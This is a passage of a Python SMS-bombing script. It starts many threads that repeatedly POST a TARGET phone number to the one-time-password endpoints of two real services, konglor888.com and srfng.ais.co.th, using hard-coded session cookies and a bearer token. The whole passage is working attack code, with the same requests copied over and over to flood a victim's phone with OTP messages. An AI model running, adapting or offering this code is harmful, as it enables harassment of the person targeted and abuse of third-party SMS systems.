    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rss)
        threading.Thread(target=s).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def t():
            rts=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rts)
        threading.Thread(target=t).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def u():
            rus=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rus)
        threading.Thread(target=u).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def v():
            rvs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rvs)
        threading.Thread(target=v).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def w():
            rws=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rws)
        threading.Thread(target=w).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def x():
            rxs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rxs)
        threading.Thread(target=x).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def y():
            rys=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(rys)
        threading.Thread(target=y).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def z():
            rzs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rzs)
        threading.Thread(target=z).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def aa():
            raas=requests.post(url='https://srfng.ais.co.th/login/sendOneTimePW', data='msisdn=66' + TARGET + '&serviceId=AISPlay&accountType=all&otpChannel=sms', headers={ 
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'content-length': '67',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aWQiOiIyMDIxMDcwOTExMzg0MzI3M3ViN215Vmw5eEZKMFciLCJzZXJ2aWNlSWQiOiJBSVNQbGF5IiwiYWNjb3VudFR5cGUiOiJhbGwiLCJvdHBDaGFubmVsIjoic21zIiwic3RhdGUiOjEsImlhdCI6MTYyNTgwNTUyMywiZXhwIjoxNjI1ODA2NzIzfQ.Gjg0AxONBAwRoInVyr6LdVzGse5KgC_IgDpLyZw5LJw',
    'cookie': 'po2YOaPtZc%252BHZHeVGrn7ZW%252BKU30SO3KrZTtte5M%252FOZkfxcMa7JIitm8nZ2sSxOTfOWWMwSy5FO6tx1sSEi9ZDB6KdVROBSUMCUmL4sW%252FLLA6ahW1%252F%252BrZ1jan%252B2q%252FW6kwWWysBGQ1yy9%252FEw9ikEYOIOIedS8D8gfnUSAJlw23hH4PBk7LoyIhxL8cSUz%252B9IeUsVoDGhZIy0ctP0eymS4pd2s8dJvTqGUA1DT%252B4K7pmb8Q5ILPB0lkX7dt8oF2cZPtS%252Bnt8%252B6owBy%252Fs9WBVn1%252FOgvmucyX3cpiVLwQ4j%252FHQSYZPTnhBMIjoHET1Crvm8R5LTxkQwlBG3%252BnCWJs%252Bi9ups%252BqwUu16%252FKbELuWlQP0c4QZZH5QycFTQSe99dLLW%252B9p0RHRzywsQIn87FPH8L0gtszrXqKiFvtxE8Pqggd3uqKYFSMwfsPmq0F0uwkn6quCBVPvhQFfu5EmKs%252FEvhFra4YP8HKIEj4XzRJb3vZ7%252FTrr2WVX05gRU6z%252FlcARYAi5%252BQKjvB5FQJ0qDyB%252FW08dzfFbAEBNJ8bXjd%252FoSLcLEXWGHxDuLZdZoktrNPoR62cGNZXwESbtOn2dewHBJZ%252B9Gy7%252FkAjB6JzJDggYU1S%252FsN4s5AeCgGP73YEnl8HzPKGkNS41f7lGfAYlh3nem8GfS8MU7nuROY67%252FFhOvro3zsP5u8S8FyZNQxwJ%252FLVCFIA%252FQJvh%252Fqn%252BMQuY3FCG0UR0aj%252BFblDcoHHilrMOL80ARYMPPXNQPF2CrT9oSAflIke55nD%252FHFLl1oNawMNhw1xDCVg8kJLlzL019hJBkc7lBHzQOuVb1OclmjClna8yuPthki7cTgWLFUCOIUWD9RPRtolQL2oXPkwtiw3wl3OvkHfgoqCY3DZ4mNPuVn02F2%252B7fJeAJcPbHN4h3oqAnN3dv%252FebBFqMykm545ps1WS8b%252BYkXN9E34lKrYdQaOBqX2MB0K%252BrppjKu4WLkLPpqJe9t28rVL%252FK%252FdDzSI%252FM5ZCE7vIV22B1nj6LG3PNoLtE6LoSy7h1rbaKo%252BgLHEsLqRBU7j2fjVR8fbJ0iYWRRt4wJfyzM%252FsdOYmg9Qsc1SWl97KkZI5dfGI7D%252F80jwbGoGjLNgEJ2LK0W8r4yi5El6yYHxR5yAOimafb9t6b%252Fkh4PDbIsk7CvntwZkg8Ox3TC1iRjSF5mvmbwiKPlHdB8Ys4YthCFGIc8UGr2QJU4MOjLaBcUnJf5osKAsuxvsJCIrfg%252B8rkwQfK%252FXiaqhGN7VIneDEFVmzTJxlBc31Y%252FpEpzlmqUmhXVEn6LaeT3IfwR%252BewbSIh14lRZLIbj%252FcH6VyRONL%252BEHbeidIaVgGScQhojuVmorPL8R2PFjqGMf6KxgJ8LfTejw00NforEkVqV4Iv5MZteQS7zJ5FtQ2OBqjU0IopJ0NK04NDUWT4fXRmFuwu2aXG4J5k10oxQ62gNmfQHTSiscOG0YmXqAK3lJRcSf9g0faZZBnu7dUoSJDi3kTaiFf1%252B%252B0oIRHbPuoCaE%252BlgqPwbBmzpSYvuPHj0o2MGfvJQDChOhpyi5rjtDhkWrNhbRw76Q9XXDlbpJUOXv%252BChwQ2CM1ZwQh%252BJXDhv%252Fs%252F7zP0JXBWMjcN14K1B012jZD2DyHjJuQJgh2YItB2ux7baojWoucuWhJBuhu1j5oWk%252FFUGMGOESjYUGfSULPs7oKJrJIvWE2BHomxxsUxfxKJ2kU4arxTSKxoXt0lsod%252FPvy1J%252BvaArAKuNRGxPMNhu9bHM4kWdbbdpQDvPXAJ20%252FEiYNbs4dQpt2SY1b55vwxmwV8xzg0LVEGfwgKfbbDrDRzjf4ZUzX3kPIJub%252FKOTuGOgIltrMEQ%253D%253D'
    })
            print(raas)
        threading.Thread(target=aa).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ab():
            rabs=requests.post(url='https://www.konglor888.com/api/otp/register', data='applicant=0' + TARGET + '&serviceName=KONGLOR888', headers={ 
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'x-requested-with': 'XMLHttpRequest',
	'accept-language': 'en-US,en;q=0.9',
	'x-frame-options': 'SAMEORIGIN',
	'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 Edg/91.0.864.41',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*',
    'cookie': 's%3AHdC70G1GrjczqiyeQwb0FMMooq0tplYL.EYzD05uo3mpUkM4EUibFO4Bc2i0kE9Tv%2FVUWkAi49T0'
    })
            print(rabs)
        threading.Thread(target=ab).start()
#---------------------------------------------------###########################################################--------------------------------------------------------------------------------------------------------------#
        def ac():
